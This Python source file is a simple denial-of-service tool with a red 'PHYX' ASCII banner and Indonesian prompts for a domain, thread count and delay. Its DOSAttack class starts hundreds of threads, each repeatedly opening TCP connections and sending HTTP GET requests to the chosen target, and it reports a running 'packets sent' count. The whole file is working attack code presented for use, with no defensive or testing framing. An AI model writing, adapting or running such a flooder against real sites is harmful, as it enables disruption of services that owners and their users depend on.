import os
import sys
import socket
import threading
import time
import random

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_ascii():
    red = "\033[91m"
    bold = "\033[1m"
    reset = "\033[0m"
    
    ascii_art = f"""{red}{bold}
██████╗ ██╗  ██╗██╗   ██╗██╗  ██╗
██╔══██╗██║  ██║╚██╗ ██╔╝╚██╗██╔╝
██████╔╝███████║ ╚████╔╝  ╚███╔╝ 
██╔═══╝ ██╔══██║  ╚██╔╝   ██╔██╗ 
██║     ██║  ██║   ██║   ██╔╝ ██╗
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
{reset}"""
    print(ascii_art)

class DOSAttack:
    def __init__(self, target, port=80, threads=500, delay=0):
        self.target = target
        self.port = port
        self.threads = threads
        self.delay = delay
        self.attack_num = 0
        self.running = False
        
    def attack(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target, self.port))
                
                # Send garbage data
                packet = f"GET / HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
                s.send(packet.encode())
                s.close()
                
                self.attack_num += 1
                print(f"\r\033[91m[\033[0m\033[1mATTACK\033[0m\033[91m]\033[0m Packets sent: {self.attack_num} to {self.target}", end="")
                
                if self.delay > 0:
                    time.sleep(self.delay)
                    
            except:
                pass
    
    def start(self):
        self.running = True
        threads_list = []
        
        print(f"\n\033[91m[\033[0m\033[1mSTART\033[0m\033[91m]\033[0m Attacking {self.target}:{self.port}")
        print(f"\033[91m[\033[0m\033[1mTHREADS\033[0m\033[91m]\033[0m {self.threads}")
        
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack)
            t.daemon = True
            threads_list.append(t)
            t.start()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        self.running = False
        print(f"\n\n\033[91m[\033[0m\033[1mSTOP\033[0m\033[91m]\033[0m Attack stopped")
        print(f"\033[91m[\033[0m\033[1mTOTAL\033[0m\033[91m]\033[0m {self.attack_num} packets sent")

def main():
    clear()
    print_ascii()
    
    print("\033[91m" + "="*50 + "\033[0m")
    print("masukan domain : ", end="")
    target = input().strip()
    
    print("total serangan : ", end="")
    try:
        threads = int(input().strip())
    except:
        threads = 500
    
    print("jeda kalau 0 ga ada jeda : ", end="")
    try:
        delay = float(input().strip())
    except:
        delay = 0
    
    if not target:
        print("\033[91m[\033[0m\033[1mERROR\033[0m\033[91m]\033[0m Domain required")
        return
    
    # Remove http:// or https:// if present
    target = target.replace("http://", "").replace("https://", "").split("/")[0]
    
    attack = DOSAttack(target, threads=threads, delay=delay)
    
    try:
        attack.start()
    except KeyboardInterrupt:
        attack.stop()
    except Exception as e:
        print(f"\n\033[91m[\033[0m\033[1mERROR\033[0m\033[91m]\033[0m {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "-dos":
        if len(sys.argv) > 2:
            target = sys.argv[2]
            clear()
            print_ascii()
            print("\033[91m" + "="*50 + "\033[0m")
            attack = DOSAttack(target)
            try:
                attack.start()
            except KeyboardInterrupt:
                attack.stop()
        else:
            print("Usage: python dos.py -dos target.com")
    else:
        main()
